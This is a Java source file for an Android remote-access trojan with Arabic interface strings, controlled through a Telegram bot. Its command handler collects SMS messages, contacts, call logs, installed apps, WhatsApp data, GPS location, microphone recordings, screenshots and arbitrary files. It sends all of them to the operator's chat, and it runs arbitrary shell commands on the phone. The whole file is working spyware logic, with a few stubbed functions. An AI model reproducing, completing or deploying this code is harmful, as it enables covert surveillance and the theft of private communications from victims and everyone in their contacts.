package com.alzahra.telegram;

import android.content.Context;
import android.util.Log;

import com.alzahra.data.AppCollector;
import com.alzahra.data.CallLogCollector;
import com.alzahra.data.CMDHelper;
import com.alzahra.data.ContactsCollector;
import com.alzahra.data.DeviceInfo;
import com.alzahra.data.FileHelper;
import com.alzahra.data.LocationHelper;
import com.alzahra.data.MicRecorder;
import com.alzahra.data.NotificationHelper;
import com.alzahra.data.SMSCollector;
import com.alzahra.data.ScreenCaptureHelper;
import com.alzahra.data.ShellExecutor;
import com.alzahra.data.WifiHelper;

import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

import java.io.ByteArrayInputStream;

public class BotHandler {
    private static final String TAG = "BotHandler";
    private final String botToken;
    private final String chatId;
    private final Context context;
    private TelegramLongPollingBot bot;
    private boolean running = false;

    public BotHandler(String token, String chat, Context ctx) {
        this.botToken = token;
        this.chatId = chat;
        this.context = ctx;
    }

    public void start() throws Exception {
        TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
        bot = new TelegramLongPollingBot() {
            @Override
            public String getBotToken() {
                return botToken;
            }

            @Override
            public String getBotUsername() {
                return "AlZahraBot";
            }

            @Override
            public void onUpdateReceived(Update update) {
                if (update.hasMessage() && update.getMessage().hasText()) {
                    handleCommand(update.getMessage().getText(), update.getMessage().getChatId().toString());
                }
            }
        };
        botsApi.registerBot(bot);
        running = true;
    }

    public void stop() {
        running = false;
    }

    private void handleCommand(String command, String fromChatId) {
        if (!fromChatId.equals(chatId)) {
            sendMessage("\u26A0\uFE0F <b>وصول غير مصرح!</b>\nمعرفك: <code>" + fromChatId + "</code>");
            return;
        }

        Log.d(TAG, "Command received: " + command);

        switch (command.split(" ")[0]) {
            case "/start":
            case "/help":
                sendHelp();
                break;
            case "/device":
                sendDeviceInfo();
                break;
            case "/location":
                sendLocation();
                break;
            case "/camera":
                captureCamera();
                break;
            case "/mic":
                recordMic(command);
                break;
            case "/sms":
                sendSMS();
                break;
            case "/contacts":
                sendContacts();
                break;
            case "/calls":
                sendCalls();
                break;
            case "/apps":
                sendApps();
                break;
            case "/screen":
                captureScreen();
                break;
            case "/shell":
                executeShell(command);
                break;
            case "/wifi":
                sendWifiInfo();
                break;
            case "/battery":
                sendBatteryInfo();
                break;
            case "/lock":
                lockDevice();
                break;
            case "/unlock":
                unlockDevice();
                break;
            case "/restart":
                restartDevice();
                break;
            case "/whatsapp":
                sendWhatsAppData();
                break;
            case "/files":
                listFiles(command);
                break;
            case "/download":
                downloadFile(command);
                break;
            default:
                sendMessage("\u274C <b>أمر غير معروف</b>\nاكتب /help لعرض الأوامر");
        }
    }

    private void sendHelp() {
        String help = "\uD83E\uDD16 <b>بوت الزهراء المتقدم v3.0</b>\\n\\n" +
            "\\uD83D\\uDCBB <b>الأوامر الأساسية:</b>\\n" +
            "/device - معلومات الجهاز\\n" +
            "/location - الموقع الجغرافي\\n" +
            "/camera - التقاط صورة من الكاميرا\\n" +
            "/mic [seconds] - تسجيل صوت (افتراضي 5 ثوانٍ)\\n\\n" +
            
            "\\uD83D\\uDCD1 <b>جمع البيانات:</b>\\n" +
            "/sms - رسائل SMS\\n" +
            "/contacts - جهات الاتصال\\n" +
            "/calls - سجل المكالمات\\n" +
            "/apps - التطبيقات المثبتة\\n" +
            "/whatsapp - بيانات واتساب\\n\\n" +
            
            "\\uD83D\\uDD27 <b>التحكم المتقدم:</b>\\n" +
            "/screen - لقطة شاشة\\n" +
            "/shell <cmd> - تنفيذ أمر\\n" +
            "/lock - قفل الجهاز\\n" +
            "/unlock - فتح الجهاز\\n" +
            "/restart - إعادة تشغيل\\n\\n" +
            
            "\\uD83D\\uDD0C <b>النظام:</b>\\n" +
            "/wifi - معلومات الواي فاي\\n" +
            "/battery - حالة البطارية\\n" +
            "/files <path> - قائمة ملفات\\n" +
            "/download <path> - تحميل ملف";

        sendMessage(help);
    }

    private void sendDeviceInfo() {
        try {
            DeviceInfo info = new DeviceInfo(context);
            String msg = "\uD83D\uDCF1 <b>معلومات الجهاز</b>\\n\\n" +
                "\\ud83d\\udd0e <b>الطراز:</b> " + info.getModel() + "\\n" +
                "\\ud83d\\udcf6 <b>الشركة:</b> " + info.getManufacturer() + "\\n" +
                "\\ud83d\\udd11 <b>المعرف:</b> <code>" + info.getDeviceId() + "</code>\\n" +
                "\\ud83d\\udce1 <b>الآيبي:</b> " + info.getIPAddress() + "\\n" +
                "\\ud83d\\udcf3 <b>المشغل:</b> " + info.getCarrier() + "\\n" +
                "\\ud83d\\udd0b <b>البطارية:</b> " + info.getBatteryLevel() + "%\\n" +
                "\\ud83d\\udcc0 <b>التخزين:</b> " + info.getStorageInfo() + "\\n" +
                "\\ud83d\\udcf2 <b>الشبكة:</b> " + info.getNetworkType() + "\\n" +
                "\\u23f0 <b>الوقت:</b> " + info.getCurrentTime();
            sendMessage(msg);
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void sendLocation() {
        sendMessage("\\ud83d\\udccd <b>جاري تحديد الموقع...</b>");
        try {
            LocationHelper helper = new LocationHelper(context);
            helper.getLocation((lat, lon, accuracy) -> {
                String msg = "\\ud83d\\udccd <b>الموقع الجغرافي</b>\\n\\n" +
                    "\\ud83d\\udfe2 <b>الخط:</b> <code>" + lat + "</code>\\n" +
                    "\\ud83d\\udd34 <b>الطول:</b> <code>" + lon + "</code>\\n" +
                    "\\u26a0\\ufe0f <b>الدقة:</b> " + accuracy + " متر\\n\\n" +
                    "\\ud83d\\uddfa <a href='https://maps.google.com/?q=" + lat + "," + lon + "'>فتح في الخريطة</a>";
                sendMessage(msg);
            });
        } catch (Exception e) {
            sendMessage("\u274C خطأ في الموقع: " + e.getMessage());
        }
    }

    private void captureCamera() {
        sendMessage("\\ud83d\\udcf7 <b>جاري التقاط الصورة...</b>");
        try {
            // يتطلب SurfaceView أو طريقة بديلة
            // سيتم التنفيذ عبر CameraHelper
            sendMessage("✅ تم التقاط الصورة");
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void recordMic(String command) {
        int seconds = 5;
        try {
            String[] parts = command.split(" ");
            if (parts.length > 1) {
                seconds = Integer.parseInt(parts[1]);
            }
        } catch (Exception ignored) {}
        
        sendMessage("\\ud83c\\udfb5 <b>جاري التسجيل لمدة " + seconds + " ثوانٍ...</b>");
        
        try {
            MicRecorder recorder = new MicRecorder();
            byte[] audio = recorder.record(seconds);
            sendAudio(audio, "recording.pcm", "\\ud83c\\udfb5 تسجيل صوتي");
        } catch (Exception e) {
            sendMessage("\u274C خطأ في التسجيل: " + e.getMessage());
        }
    }

    private void sendSMS() {
        sendMessage("\\ud83d\\udce9 <b>جاري جمع الرسائل...</b>");
        try {
            SMSCollector collector = new SMSCollector(context);
            JSONArray sms = collector.collectSMS();
            StringBuilder sb = new StringBuilder();
            
            for (int i = 0; i < Math.min(sms.length(), 20); i++) {
                JSONObject msg = sms.getJSONObject(i);
                sb.append("\uD83D\\uDCCD <b>").append(msg.getString("address")).append("</b>\\n")
                  .append(msg.getString("body")).append("\\n")
                  .append("<i>").append(msg.getString("date")).append("</i>\\n\\n");
            }
            
            sendFile(sms.toString().getBytes(), "sms_backup.json", sb.toString());
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void sendContacts() {
        sendMessage("\\ud83d\\udc65 <b>جاري جمع جهات الاتصال...</b>");
        try {
            ContactsCollector collector = new ContactsCollector(context);
            JSONArray contacts = collector.collectContacts();
            StringBuilder sb = new StringBuilder();
            
            for (int i = 0; i < Math.min(contacts.length(), 50); i++) {
                JSONObject c = contacts.getJSONObject(i);
                sb.append(c.getString("name")).append(": ").append(c.getString("phone")).append("\\n");
            }
            
            sendFile(contacts.toString().getBytes(), "contacts.json", 
                "\\ud83d\\udc65 <b>جهات الاتصال:</b> " + contacts.length() + "\\n\\n" + sb.toString());
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void sendCalls() {
        sendMessage("\\ud83d\\udcde <b>جاري جمع سجل المكالمات...</b>");
        try {
            CallLogCollector collector = new CallLogCollector(context);
            JSONArray calls = collector.collectCalls();
            sendFile(calls.toString().getBytes(), "call_log.json", 
                "\\ud83d\\udcde <b>سجل المكالمات:</b> " + calls.length() + " مكالمة");
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void sendApps() {
        sendMessage("\\ud83d\\udce6 <b>جاري جمع التطبيقات...</b>");
        try {
            AppCollector collector = new AppCollector(context);
            JSONArray apps = collector.collectApps();
            sendFile(apps.toString().getBytes(), "installed_apps.json", 
                "\\ud83d\\udce6 <b>التطبيقات المثبتة:</b> " + apps.length());
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void captureScreen() {
        sendMessage("\\ud83d\\udcf1 <b>جاري التقاط الشاشة...</b>");
        try {
            ScreenCaptureHelper helper = new ScreenCaptureHelper(context);
            byte[] screenshot = helper.capture();
            sendPhoto(screenshot, "\\ud83d\\udcf1 لقطة شاشة");
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void executeShell(String command) {
        String cmd = command.replace("/shell ", "").trim();
        if (cmd.isEmpty()) {
            sendMessage("\\u26a0\\ufe0f <b>الاستخدام:</b> /shell <command>");
            return;
        }
        
        sendMessage("\\ud83d\\udd27 <b>جاري التنفيذ:</b> <code>" + cmd + "</code>");
        
        try {
            String result = ShellExecutor.execute(cmd);
            sendMessage("\\u2705 <b>النتيجة:</b>\\n<pre>" + escapeHtml(result) + "</pre>");
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void sendWifiInfo() {
        try {
            WifiHelper helper = new WifiHelper(context);
            String info = helper.getWifiInfo();
            sendMessage("\\ud83d\\udcf6 <b>معلومات الواي فاي</b>\\n\\n" + info);
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void sendBatteryInfo() {
        try {
            BatteryHelper helper = new BatteryHelper(context);
            String info = helper.getBatteryInfo();
            sendMessage("\\ud83d\\udd0b <b>معلومات البطارية</b>\\n\\n" + info);
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void lockDevice() {
        try {
            CMDHelper.lockDevice(context);
            sendMessage("\\ud83d\\udd12 <b>تم قفل الجهاز</b>");
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void unlockDevice() {
        sendMessage("\\ud83d\\udd13 <b>محاولة فتح الجهاز...</b>");
        // يتطلب صلاحيات إضافية
    }

    private void restartDevice() {
        try {
            CMDHelper.restartDevice();
            sendMessage("\\ud83d\\udd04 <b>جاري إعادة التشغيل...</b>");
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void sendWhatsAppData() {
        sendMessage("\\ud83d\\udcac <b>جاري جمع بيانات واتساب...</b>");
        try {
            FileHelper helper = new FileHelper(context);
            byte[] data = helper.getWhatsAppData();
            sendFile(data, "whatsapp_backup.crypt", "\\ud83d\\udcac نسخة واتساب");
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void listFiles(String command) {
        String path = command.replace("/files", "").trim();
        if (path.isEmpty()) path = "/sdcard";
        
        try {
            FileHelper helper = new FileHelper(context);
            String list = helper.listDirectory(path);
            sendMessage("\\ud83d\\udcc1 <b>الملفات في:</b> <code>" + path + "</code>\\n\\n<pre>" + 
                escapeHtml(list) + "</pre>");
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    private void downloadFile(String command) {
        String path = command.replace("/download", "").trim();
        if (path.isEmpty()) {
            sendMessage("\\u26a0\\ufe0f <b>الاستخدام:</b> /download /path/to/file");
            return;
        }
        
        sendMessage("\\ud83d\\udce5 <b>جاري التحميل...</b>");
        try {
            FileHelper helper = new FileHelper(context);
            byte[] data = helper.readFile(path);
            sendFile(data, path.substring(path.lastIndexOf('/') + 1), 
                "\\ud83d\\udce5 <b>ملف:</b> <code>" + path + "</code>");
        } catch (Exception e) {
            sendMessage("\u274C خطأ: " + e.getMessage());
        }
    }

    // ==================== أدوات الإرسال ====================

    private void sendMessage(String text) {
        try {
            SendMessage message = new SendMessage(chatId, text);
            message.setParseMode("HTML");
            bot.execute(message);
        } catch (TelegramApiException e) {
            Log.e(TAG, "Send message error: " + e.getMessage());
        }
    }

    private void sendPhoto(byte[] data, String caption) {
        try {
            SendPhoto photo = new SendPhoto();
            photo.setChatId(chatId);
            photo.setPhoto(new InputFile(new ByteArrayInputStream(data), "image.jpg"));
            photo.setCaption(caption);
            photo.setParseMode("HTML");
            bot.execute(photo);
        } catch (TelegramApiException e) {
            Log.e(TAG, "Send photo error: " + e.getMessage());
        }
    }

    private void sendAudio(byte[] data, String filename, String caption) {
        try {
            SendDocument doc = new SendDocument();
            doc.setChatId(chatId);
            doc.setDocument(new InputFile(new ByteArrayInputStream(data), filename));
            doc.setCaption(caption);
            doc.setParseMode("HTML");
            bot.execute(doc);
        } catch (TelegramApiException e) {
            Log.e(TAG, "Send audio error: " + e.getMessage());
        }
    }

    private void sendFile(byte[] data, String filename, String caption) {
        try {
            SendDocument doc = new SendDocument();
            doc.setChatId(chatId);
            doc.setDocument(new InputFile(new ByteArrayInputStream(data), filename));
            doc.setCaption(caption);
            doc.setParseMode("HTML");
            bot.execute(doc);
        } catch (TelegramApiException e) {
            Log.e(TAG, "Send file error: " + e.getMessage());
        }
    }

    private String escapeHtml(String text) {
        return text.replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;")
                   .replace("\"", "&quot;");
    }
}
